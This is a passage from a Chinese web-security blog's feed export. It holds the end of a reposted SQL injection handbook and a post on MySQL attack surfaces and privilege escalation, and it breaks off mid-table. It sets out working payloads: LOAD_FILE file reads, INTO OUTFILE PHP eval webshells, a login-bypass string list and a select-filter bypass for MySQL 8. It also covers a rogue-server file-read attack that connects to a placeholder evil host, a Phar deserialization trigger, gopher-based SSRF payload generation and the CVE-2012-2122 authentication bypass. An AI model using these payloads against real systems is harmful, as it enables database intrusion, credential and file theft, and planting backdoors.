@@max_allowed_packet;</span><br></pre></td></tr></table></figure><p>一般用load_file来看config.php（即mysql的密码）,apache配置、servu密码等。前提是要知道物理路径。</p><p>常见paylaod</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UNION SELECT LOAD_FILE(&quot;C:&#x2F;&#x2F;TEST.txt&quot;) #</span><br><span class="line">UNION SELECT LOAD_FILE(&quot;C:&#x2F;TEST.txt&quot;) #</span><br><span class="line">UNION SELECT LOAD_FILE(&quot;C:\\TEST.txt&quot;) #</span><br></pre></td></tr></table></figure><p>后面的路径可以是单引号、0x、char转换的字符<br>路径中的斜杠是/而不是\</p><p>使用编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UNION SELECT LOAD_FILE(CHAR(67,58,92,92,84,69,83,84,46,116,120,116)) #</span><br><span class="line">UNION SELECT LOAD_FILE(0x433a5c5c544553542e747874) #</span><br></pre></td></tr></table></figure><ul><li>out_file()</li></ul><p>outfile后面不能接0x开头或者char转换以后的路径，只能是单引号路径<br>经典一句话payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#39;&lt;?php eval($_POST[cmd])?&gt;&#39; into outfile &#39;C:&#x2F;www&#x2F;shell.php&#39;</span><br></pre></td></tr></table></figure><p>当然也可以从表中选数据写</p><h4 id="万能密码">万能密码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">admin’ —</span><br><span class="line">admin’ #</span><br><span class="line">admin’&#x2F;*</span><br><span class="line">or ‘&#x3D;’ or</span><br><span class="line">‘ or 1&#x3D;1—</span><br><span class="line">‘ or 1&#x3D;1#</span><br><span class="line">‘ or 1&#x3D;1&#x2F;*</span><br><span class="line">‘) or ‘1’&#x3D;’1—</span><br><span class="line">‘) or (‘1’&#x3D;’1—</span><br></pre></td></tr></table></figure><h2 id="UPDATE">UPDATE</h2><h3 id="利用MySQL8新特性绕过select过滤">利用MySQL8新特性绕过select过滤</h3><p>在MySQL 8.0.19之后，MySQL推出几种新语法：</p><ul><li><strong>TABLE statement</strong> - 列出表中全部内容</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; TABLE user;</span><br><span class="line">+----+----------+---------+</span><br><span class="line">| id | username | passwd  |</span><br><span class="line">+----+----------+---------+</span><br><span class="line">|  1 | admin    | adminpw |</span><br><span class="line">|  2 | tom      | tompw   |</span><br><span class="line">|  3 | kak      | kakpw   |</span><br><span class="line">+----+----------+---------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><ul><li><strong>VALUES statement</strong> - 列出一行的值</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; VALUES ROW(1, 2, 3) UNION SELECT * FROM user;</span><br><span class="line">+----------+----------+----------+</span><br><span class="line">| column_0 | column_1 | column_2 |</span><br><span class="line">+----------+----------+----------+</span><br><span class="line">|        1 | 2        | 3        |</span><br><span class="line">|        1 | admin    | adminpw  |</span><br><span class="line">|        2 | tom      | tompw    |</span><br><span class="line">|        3 | kak      | kakpw    |</span><br><span class="line">+----------+----------+----------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>假设以下代码是在过滤select, handler以及禁用堆叠注入的情景下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_GET[<span class="string">&#x27;showme&#x27;</span>]))</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"> </span><br><span class="line">$aaa = mysqli_connect(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;rootroot&#x27;</span>, <span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($_GET[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">    $id = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    $id = $_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"> </span><br><span class="line">$clean = strtolower($id);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (strpos($clean, <span class="string">&#x27;select&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;waf&#x27;</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">var_dump(<span class="string">&quot;select * from news where <span class="subst">$id</span>=&#x27;<span class="subst">$id</span>&#x27;&quot;</span>);</span><br><span class="line">$result = mysqli_query($aaa, <span class="string">&quot;select * from news where id =&#x27;<span class="subst">$id</span>&#x27;&quot;</span>);</span><br><span class="line">$row = mysqli_fetch_array($result);</span><br><span class="line">$title = $row[<span class="string">&#x27;title&#x27;</span>];</span><br><span class="line">$content = $row[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;<span class="subst">$title</span>&lt;/h1&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;<span class="subst">$content</span>&lt;/h2&gt;&lt;br&gt;&quot;</span>;</span><br></pre></td></tr></table></figure><p>构造恶意sql语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from news where $id&#x3D;&#39;&#39; or (1,&#39;admin&#39;,&#39;&#123;passwd&#125;&#39;) &lt;&#x3D; (table user limit 1)#</span><br></pre></td></tr></table></figure><p>语句table user limit 1的查询结果如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">+----+----------+---------+</span><br><span class="line">| id | username | passwd  |</span><br><span class="line">+----+----------+---------+</span><br><span class="line">|  1 | admin    | adminpw |</span><br><span class="line">+----+----------+---------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>实质上是<code>(id, username, passwd)</code>与<code>(1, 'admin', 'adminpw')</code>进行比较，比较顺序为自左向右 两个元组第一个字符比大小，如果第一个字符相等就比第二个字符的大小，以此类推，最终结果即为元组的大小</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT (1, &#39;&#39;, &#39;&#39;) &lt; (TABLE user LIMIT 1);</span><br><span class="line">+-------------------------------------+</span><br><span class="line">| (1, &#39;&#39;, &#39;&#39;) &lt; (TABLE user LIMIT 1)  |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">|                                   1 |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt; SELECT (2, &#39;&#39;, &#39;&#39;) &lt; (TABLE user LIMIT 1);</span><br><span class="line">+-------------------------------------+</span><br><span class="line">| (2, &#39;&#39;, &#39;&#39;) &lt; (TABLE user LIMIT 1)  |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">|                                   0 |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt; SELECT (1, &#39;a&#39;, &#39;&#39;) &lt; (TABLE user LIMIT 1);</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| (1, &#39;a&#39;, &#39;&#39;) &lt; (TABLE user LIMIT 1)  |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">|                                    1 |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt; SELECT (1, &#39;ad&#39;, &#39;&#39;) &lt; (TABLE user LIMIT 1);</span><br><span class="line">+---------------------------------------+</span><br><span class="line">| (1, &#39;ad&#39;, &#39;&#39;) &lt; (TABLE user LIMIT 1)  |</span><br><span class="line">+---------------------------------------+</span><br><span class="line">|                                     1 |</span><br><span class="line">+---------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt; SELECT (1, &#39;ae&#39;, &#39;&#39;) &lt; (TABLE user LIMIT 1);</span><br><span class="line">+---------------------------------------+</span><br><span class="line">| (1, &#39;ae&#39;, &#39;&#39;) &lt; (TABLE user LIMIT 1)  |</span><br><span class="line">+---------------------------------------+</span><br><span class="line">|                                     0 |</span><br><span class="line">+---------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>转载自：<a href="https://0xgeekcat.github.io/%E5%88%A9%E7%94%A8MySQL8%E6%96%B0%E7%89%B9%E6%80%A7%E7%BB%95%E8%BF%87select%E8%BF%87%E6%BB%A4.html">https://0xgeekcat.github.io/利用MySQL8新特性绕过select过滤.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SQL注入手册【转】&quot;&gt;SQL注入手册【转】&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;来自https://northity.com/2019/03/02/Sql%E6%B3%A8%E5%85%A5%E6%89%8B%E5%86%8C&lt;/p&gt;
&lt;/blockquo
      
    
    </summary>
    
    
      <category term="Web安全" scheme="http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="基础学习" scheme="http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="Web安全学习" scheme="http://ca0y1h.top/tags/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="SQL注入" scheme="http://ca0y1h.top/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>MySQL攻击面和提权总结</title>
    <link href="http://ca0y1h.top/Web_security/basic_learning/26.MySQL%E6%94%BB%E5%87%BB%E9%9D%A2%E5%92%8C%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/"/>
    <id>http://ca0y1h.top/Web_security/basic_learning/26.MySQL%E6%94%BB%E5%87%BB%E9%9D%A2%E5%92%8C%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/</id>
    <published>2020-12-10T15:11:36.000Z</published>
    <updated>2020-12-10T15:13:20.756Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MySQL攻击面和提权总结">MySQL攻击面和提权总结</h1><p>本次实验使用腾讯云主机的MySQL Server作为服务端，阿里云主机作为MySQL客户端。</p><p>其中均使用宝塔面板搭建MySQL8.0版本。</p><p>首先要开放腾讯云主机的端口，并且允许MySQL Server允许任意用户远程登录。</p><h2 id="0x01-攻击面——MySQL客户端任意文件读取">0x01 攻击面——MySQL客户端任意文件读取</h2><blockquote><p>适用范围：全版本 MySQL/MariaDB Client</p><p>条件：客户端连接时开启 –enable-local-infile</p></blockquote><p>一开始做实验的时候有点懵逼，我作为攻击方去连接受害者的MySQL客户端，然后再读取我本地的文件？？？</p><p>后来我再网上查看这个攻击面的利用场景，虽然确实用的地方比较少，但是看了<strong>LoRexxar</strong>这篇<a href="https://paper.seebug.org/1112/">文章</a>之后，还是很有收获的。</p><blockquote><p>这个实验的前提MySQL变量<code>local_infile=1</code></p></blockquote><p>CTFer对MySQL的load data infile语句应该都是比较熟悉的，一般形式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load data infile &quot;&#x2F;etc&#x2F;passwd&quot; into table mytable FIELDS TERMINATED BY &#39;\n&#39;;</span><br></pre></td></tr></table></figure><p>MySQL Server会读取服务端的<code>/etc/passwd</code>然后将数据按照<code>\n</code>分割插入表中，但是非local加载的语句收到<code>secure_file_priv</code>的限制：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; load data infile &quot;&#x2F;etc&#x2F;passwd&quot; into table mytable FIELDS TERMINATED BY &#39;\n&#39;;</span><br><span class="line">ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement</span><br><span class="line">mysql&gt; select @@secure_file_priv;</span><br><span class="line">+--------------------+</span><br><span class="line">| @@secure_file_priv |</span><br><span class="line">+--------------------+</span><br><span class="line">| NULL               |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>但是加上一个local关键字：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; load data local infile &quot;&#x2F;etc&#x2F;passwd&quot; into table mytable FIELDS TERMINATED BY &#39;\n&#39;;</span><br><span class="line">Query OK, 4 rows affected, 1 warning (0.02 sec)</span><br><span class="line">Records: 4  Deleted: 0  Skipped: 0  Warnings: 1</span><br></pre></td></tr></table></figure><p>是可以成功执行的，相当于是读取客户端的文件发送到服务端。</p><p>MySQL认为<strong>服务端可以要求客户端读取有可读权限的任何文件，客户端不应该连接到不可信的服务端</strong>。</p><p>那么现在的问题就是如何构造一个恶意的MySQL服务端。</p><p>在搞清楚这个问题之前，我们需要研究一下mysql正常执行链接和查询的数据包结构。</p><ol><li>Sever返回greeting包，包含版本，协议类型，salt值，server功能项</li></ol><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201109131329.png" alt=""></p><ol start="2"><li>客户端登录请求</li></ol><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201109134218.png" alt=""></p><p>不知道为啥请求包没有显示用户名，可能是MySQL版本的原因。</p><ol start="3"><li>初始化查询</li></ol><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201109135309.png" alt=""></p><p>由于使用了SSL通信，所以这里看不到具体的初始化查询语句。</p><ol start="4"><li>Load file data</li></ol><p>这次得把MySQL的SSL连接关闭掉，不然看不到执行语句。方法就是在MySQL的配置文件my.conf的[mysqld]添加<code>skip_ssl</code>即可，再在客户端检查一下是否已经关闭SSL：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201109140218.png" alt=""></p><p>确认关闭后，执行load file data语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load data local infile &#39;&#x2F;etc&#x2F;passwd&#39; into table mytable FIELDS TERMINATED BY &#39;\n&#39;;</span><br></pre></td></tr></table></figure><p>首先是客户端发发送查询</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201109140817.png" alt=""></p><p>接着服务端返回了需要的路径，功能类似于告诉客户端把这个文件发给我让我看看</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201109145329.png" alt="">****</p><p>然后客户端直接把内容发送到了服务端</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201109145747.png" alt=""></p><p>从上面这个流程可以看出，客户端读取文件的路径并不是从客户端指定的，而是从服务端指定再发送客户端。</p><p>正常的查询流程：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Client: 我要把&#x2F;etc&#x2F;passwd插入表中</span><br><span class="line">Server: 我要你的&#x2F;etc&#x2F;passwd的内容</span><br><span class="line">Client: &#x2F;etc&#x2F;passwd的内容为...</span><br></pre></td></tr></table></figure><p>如果是一个恶意的服务端，可以把流程更改为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Client: 我要test表中的内容</span><br><span class="line">Server: 我要你的&#x2F;etc&#x2F;passwd的内容</span><br><span class="line">Client: &#x2F;etc&#x2F;passwd的内容为？？？</span><br></pre></td></tr></table></figure><p>并且从MySQL的官方文档中指出<strong>服务端可以在任何查询语句后回复文件传输请求</strong>，也就是说上面第三个语句是可以执行的。</p><p>所以构造一个恶意服务端的流程就是：1.回复MySQL client一个greeting包；2.等待client端发送一个查询包；3.回复一个file transfer包。</p><p>发现这个漏洞的原作者给出了POC，但是LoRexxar文中提到这个POC并没有适配所有的情况，部分mysql客户端会在登陆成功之后发送ping包，如果没有回复就会断开连接，也有部分mysql client端对greeting包有较强的校验。</p><p>这里就拿网上更改之后的POC来拿做实验：<a href="https://github.com/allyshka/Rogue-MySql-Server">https://github.com/allyshka/Rogue-MySql-Server</a></p><ol><li>暂停MySQL Server服务</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service mysqld stop</span><br></pre></td></tr></table></figure><ol start="2"><li>运行恶意MySQL服务器脚本</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python rogue_mysql_server.py</span><br></pre></td></tr></table></figure><ol start="3"><li>客户端访问MySQL服务器</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h xxx -u root -p</span><br></pre></td></tr></table></figure><ol start="4"><li>查看mysql.log文件</li></ol><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201109153808.png" alt=""></p><p>LoRexxar文章中还接着提到了关于这个漏洞的进一步利用，比如说读取配置文件，Phar反序列化等等。</p><p>其中Phar反序列化这个还挺有意思的，首先生成一个phar：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $s = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;pwned!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">&quot;GIF89a &quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">$o = <span class="keyword">new</span> A();</span><br><span class="line">$phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后用test.php模拟一次查询</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $s = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;pwned!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$m = mysqli_init();</span><br><span class="line">mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, <span class="literal">true</span>);</span><br><span class="line">$s = mysqli_real_connect($m, <span class="string">&#x27;&#123;evil_mysql_ip&#125;&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>, <span class="string">&#x27;test&#x27;</span>, <span class="number">3667</span>);</span><br><span class="line">$p = mysqli_query($m, <span class="string">&#x27;select 1;&#x27;</span>);</span><br></pre></td></tr></table></figure><p>伪造的evil mysql server中让mysql client去做<code>load file local</code>查询，读取本地的phar文件。</p><h2 id="0x02-攻击面——利用SSRF攻击MySQL">0x02 攻击面——利用SSRF攻击MySQL</h2><blockquote><p>适用范围：全版本 MySQL/MariaDB Server</p><p>条件：拥有空密码用户</p></blockquote><p>之前在总结SSRF漏洞的时候提到过利用SSRF攻击Redis和FastCGI，没写过关于MySQL。</p><p>同样的，利用SSRF攻击MySQL也需要了解MySQL的完整交互协议，并且伪造客户端，通过SSRF进行交互连接。</p><p>参考文章同样来自于一篇Seebug上的文章：<a href="https://paper.seebug.org/510/">https://paper.seebug.org/510/</a></p><p>这个利用条件比较苛刻，可以归属于未授权访问，因为非交互模式下登录并操作MySQL只能无需密码认证。</p><p>关于MySQL的认证过程和报文格式我就不多叙述，这里直接演示一下过程，以腾讯云主机MySQL80作为实验机，本地登录。</p><p>首先需要新建一个MySQL用户，并且密码为空，使用root登录MySQL后执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CREATE USER &#39; usernopass&#39;@&#39;localhost&#39;;</span><br><span class="line">GRANT USAGE ON *.* TO &#39; usernopass&#39;@&#39;localhost&#39;;</span><br><span class="line">GRANT ALL ON *.* TO &#39; usernopass&#39;@&#39;localhost&#39;;</span><br></pre></td></tr></table></figure><p>有两个办法，一种是用gopherus工具直接生成payload。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201110130516.png" alt=""></p><p>另外一种是自己抓包生成原始数据流，再转换成gopher协议的格式。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201110130638.png" alt=""></p><p>再利用脚本转换一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">result</span>(<span class="params">s</span>):</span></span><br><span class="line">a=[s[i:i+<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,len(s),<span class="number">2</span>)]</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;curl gopher://127.0.0.1:3306/_%&quot;</span> + <span class="string">&quot;%&quot;</span>.join(a)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">s=sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">print</span> result(s)</span><br></pre></td></tr></table></figure><p>但是这两种办法我都没能复现出来，可能是看不到执行的结果。</p><p>接下来，可以使用SSRF攻击MySQL，那么就可以利用MySQL写入webshell，但是要求secure_file_priv不能为空。</p><h2 id="0x03攻击面——MySQL服务端文件读写">0x03攻击面——MySQL服务端文件读写</h2><p>这个就比较简单了，但是对要求服务端配置可读写目录和正确的用户权限。</p><p>读文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT LOAD_FILE (&#39;&#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F;aaa&#39;) AS Result;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create database test;</span><br><span class="line">CREATE TABLE test (id TEXT, content TEXT);</span><br><span class="line">load data infile &quot;&#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F;aaa&quot; into table test.test FIELDS TERMINATED BY &#39;\n\r&#39; ;</span><br></pre></td></tr></table></figure><p>写文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat (id) from test INTO OUTFILE &quot;&#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F;aaaa&quot;;</span><br></pre></td></tr></table></figure><h2 id="0x04提权">0x04提权</h2><p>提权就不写那么详细了，主要是参考m00nback的文章：<a href="https://www.m00nback.xyz/2020/03/30/mysql%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/">https://www.m00nback.xyz/2020/03/30/mysql提权总结/</a></p><h3 id="CVE-2012-2122">CVE-2012-2122</h3><p>该漏洞是身份认证绕过漏洞，当连接MariaDB/MySQL时，输入的密码会与期望的正确密码比较，由于不正确的处理，会导致即便是memcmp()返回一个非零值，也会使MySQL认为两个密码是相同的。也就是说只要知道用户名，不断尝试就能够直接登入SQL数据库。</p><p>影响版本：</p><ul><li>MariaDB versions from 5.1.62, 5.2.12, 5.3.6, 5.5.23 are not.</li><li>MySQL versions from 5.1.63, 5.5.24, 5.6.6 are not.</li></ul><p>MSF有相关利用模块：<code>use auxiliary/scanner/mysql/mysql_authbypass_hashdump</code></p><h3 id="写shell">写shell</h3><h4 id="outfile写shell">outfile写shell</h4><p>跟上面描述的差不多，关键还是<code>secure_file_priv</code>这个参数，而且是只读参数，必须更改MySQL的配置文件再重启MySQL服务。</p><p>来个🌰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#39;&lt;?php @eval($_POST[1]);?&gt;&#39; into outfile &quot;&#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F;aaa&quot;;</span><br></pre></td></tr></table></figure><h4 id="日志写shell">日志写shell</h4><p>前提是知道MySQL root用户密码，第一步开启日志记录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 